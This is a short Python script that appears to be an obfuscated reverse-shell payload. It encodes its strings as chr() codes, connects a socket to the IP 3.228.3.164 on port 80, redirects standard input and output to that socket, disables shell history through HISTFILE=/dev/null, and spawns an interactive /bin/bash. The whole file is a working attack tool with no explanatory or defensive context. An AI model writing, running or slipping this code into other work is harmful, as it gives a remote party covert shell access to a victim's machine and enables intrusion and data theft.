import os
n=os.putenv
m=os.dup2
import pty
w=pty.spawn
import socket
y=socket.SOCK_STREAM
X=socket.AF_INET
G=socket.socket
F=("".join([chr(51),chr(46),chr(50),chr(50),chr(56),chr(46),chr(51),chr(46),chr(49),chr(54),chr(52)]))
t=int("".join([chr(56),chr(48)]))
s=G(X,y)
s.connect((F,t));m(s.fileno(),int("".join([chr(48)]))                               )
m(s.fileno(),int("".join([chr(49)]))              )
m(s.fileno(),int("".join([chr(50)]))              )
n(("".join([chr(72),chr(73),chr(83),chr(84),chr(70),chr(73),chr(76),chr(69)]))            ,("".join([chr(47),chr(100),chr(101),chr(118),chr(47),chr(110),chr(117),chr(108),chr(108)]))                        )
w(("".join([chr(47),chr(98),chr(105),chr(110),chr(47),chr(98),chr(97),chr(115),chr(104)]))             )
s.close()
